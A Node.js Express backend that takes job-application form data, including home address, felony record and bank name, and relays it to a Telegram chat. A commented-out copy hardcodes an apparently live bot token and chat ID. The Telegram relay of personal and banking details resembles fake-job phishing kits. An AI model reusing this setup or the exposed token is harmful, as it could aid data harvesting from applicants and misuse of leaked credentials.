import express from 'express';
import cors from 'cors';
import axios from 'axios';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/api/submit-application', async (req, res) => {
  try {
    const formData = req.body;

    if (!formData) {
      return res.status(400).json({ error: "No form data received" });
    }

    const requiredFields = [
      'firstName', 'lastName', 'phone', 'email',
      'streetAddress', 'city', 'state', 'postalCode',
      'country', 'felonyConviction', 'paymentMethod',
      'salaryType', 'bankName'
    ];

    const missingFields = requiredFields.filter(field => !formData[field]);
    if (missingFields.length > 0) {
      return res.status(400).json({
        error: "Missing required fields",
        details: missingFields.join(', ')
      });
    }

    const message = `
🎯 New Application Received

👤 Personal Information:
- Name: ${formData.firstName} ${formData.lastName}
- Phone: ${formData.phone}
- Email: ${formData.email}

📍 Address:
${formData.streetAddress}
${formData.addressLine2 ? formData.addressLine2 + '\n' : ''}${formData.city}, ${formData.state} ${formData.postalCode}
${formData.country}

❓ Background:
- Felony Conviction: ${formData.felonyConviction}

📱 Source:
${Array.isArray(formData.heardFrom) ? formData.heardFrom.map(source => `- ${source.toUpperCase()}`).join('\n') : 'None specified'}

💰 Payment Details:
- Method: ${formData.paymentMethod}
- Salary Type: ${formData.salaryType}
- Bank: ${formData.bankName}

✅ Terms Accepted: ${formData.termsAccepted ? 'Yes' : 'No'}
    `.trim();

    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    if (telegramResponse.status !== 200) {
      throw new Error('Failed to send message to Telegram');
    }

    res.json({
      success: true,
      message: "Application submitted successfully"
    });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({
      error: "Failed to submit application",
      details: error.message
    });
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
});





// import express from 'express';
// import cors from 'cors';
// import axios from 'axios';
// import dotenv from 'dotenv';

// dotenv.config();

// const app = express();
// const port = 3000;

// app.use(cors());
// app.use(express.json());

// const TELEGRAM_BOT_TOKEN = "7122701602:AAEb3dv5enjswtlIyNwfTPQjN7JHQ6q5gHk";
// const TELEGRAM_CHAT_ID = "-1002621531560";

// app.post('/api/submit-application', async (req, res) => {
//   try {
//     const formData = req.body;

//     if (!formData) {
//       return res.status(400).json({ error: "No form data received" });
//     }

//     const requiredFields = [
//       'firstName', 'lastName', 'phone', 'email',
//       'streetAddress', 'city', 'state', 'postalCode',
//       'country', 'felonyConviction', 'paymentMethod',
//       'salaryType', 'bankName'
//     ];

//     const missingFields = requiredFields.filter(field => !formData[field]);
//     if (missingFields.length > 0) {
//       return res.status(400).json({
//         error: "Missing required fields",
//         details: missingFields.join(', ')
//       });
//     }

//     const message = `
// 🎯 New Application Received

// 👤 Personal Information:
// - Name: ${formData.firstName} ${formData.lastName}
// - Phone: ${formData.phone}
// - Email: ${formData.email}

// 📍 Address:
// ${formData.streetAddress}
// ${formData.addressLine2 ? formData.addressLine2 + '\n' : ''}${formData.city}, ${formData.state} ${formData.postalCode}
// ${formData.country}

// ❓ Background:
// - Felony Conviction: ${formData.felonyConviction}

// 📱 Source:
// ${Array.isArray(formData.heardFrom) ? formData.heardFrom.map(source => `- ${source.toUpperCase()}`).join('\n') : 'None specified'}

// 💰 Payment Details:
// - Method: ${formData.paymentMethod}
// - Salary Type: ${formData.salaryType}
// - Bank: ${formData.bankName}

// ✅ Terms Accepted: ${formData.termsAccepted ? 'Yes' : 'No'}
//     `.trim();

//     const telegramResponse = await axios.post(
//       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
//       {
//         chat_id: TELEGRAM_CHAT_ID,
//         text: message,
//       }
//     );

//     if (telegramResponse.status !== 200) {
//       throw new Error('Failed to send message to Telegram');
//     }

//     res.json({
//       success: true,
//       message: "Application submitted successfully"
//     });
//   } catch (error) {
//     console.error('Error processing request:', error);
//     res.status(500).json({
//       error: "Failed to submit application",
//       details: error.message
//     });
//   }
// });

// app.listen(port, () => {
//   console.log(`Server running on port ${port}`);
// });
